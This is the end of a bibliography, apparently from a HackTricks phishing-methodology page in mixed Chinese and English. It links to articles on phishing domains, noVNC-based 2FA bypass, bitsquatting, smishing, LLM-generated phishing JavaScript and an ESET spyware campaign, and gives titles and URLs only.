- [2] [发现 Phishing：Tools and Techniques（0xPatrik）](https://0xpatrik.com/phishing-domains/)
- [3] [使用 noVNC 窃取 Credentials 并绕过 2FA（mr.d0x）](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [使用 EvilnoVNC 窃取 Sessions 并绕过 2FA（darkbyte.net）](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [如何在 Debian Wheezy 上安装并配置带 Postfix 的 DKIM（DigitalOcean）](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Silent Smishing – mobile-gated phishing infra and heuristics（Sekoia.io）](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Runtime Assembly Attacks 的下一前沿：利用 LLMs 实时生成 Phishing JavaScript](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Impersonation、Click Hijacking 与 TDS：深入了解 Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting Windows.com（Remy Hax）](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [通过 bitflipping 劫持指向 Microsoft windows.com 的 traffic（BleepingComputer）](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Love? Actually：在巴基斯坦针对性 spyware campaign 中作为 lure 使用的 fake dating app](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoCs 和 samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
{{#include ../../banners/hacktricks-training.md}}
